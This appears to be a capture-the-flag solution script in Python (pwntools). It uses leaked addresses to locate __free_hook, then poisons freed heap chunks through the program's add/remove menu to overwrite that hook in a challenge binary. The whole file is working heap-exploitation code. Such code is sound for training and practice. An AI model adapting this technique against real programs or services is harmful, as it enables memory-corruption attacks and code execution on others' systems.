from pwn import *

context.arch = "x86_64"


def connexion():
    if args.LOCAL:
        p = process("../challenge/chall_patched")
        return p
    elif args.REMOTE:
        HOST, PORT = "", 9006
        p = remote(HOST, PORT)
        return p
    else:
        exit(0)


def add_entry(size, content) -> None:
    p.sendlineafter("option: ", "1")
    p.sendlineafter("Size:", str(size))
    p.sendlineafter("Content: ", content)


def remove_entry(index) -> None:
    p.sendlineafter("option: ", "3")
    p.sendlineafter("index: ", str(index))


def main():
    global p
    p = connexion()
    p.recvuntil("gift: ")
    win_addr = p.recvline().rstrip()
    log.info(f"win addr: {hex(int(win_addr, 16))}")
    p.recvuntil("gift: ")
    printf_addr = p.recvline().rstrip()
    log.info(f"printf addr: {hex(int(printf_addr, 16))}")
    printf_addr = int(printf_addr, 16)
    free_hook = printf_addr - 0x3D830 + 0x1C25A8
    log.info(f"free hook: {hex(free_hook)}")

    add_entry(0x58, b"A" * 0x58)  # 0
    add_entry(0x180, b"B" * 0x180)  # 1

    remove_entry(0)
    remove_entry(1)

    add_entry(0x58, b"A" * 0x58)  # 0
    remove_entry(1)
    add_entry(0x180, p64(free_hook))
    add_entry(0x80, b"A" * 0x80)
    add_entry(0x80, p64(printf_addr) + b"\x00" * (0x80 - len(p64(printf_addr))))
    gdb.attach(p)
    p.interactive()


if __name__ == "__main__":
    main()
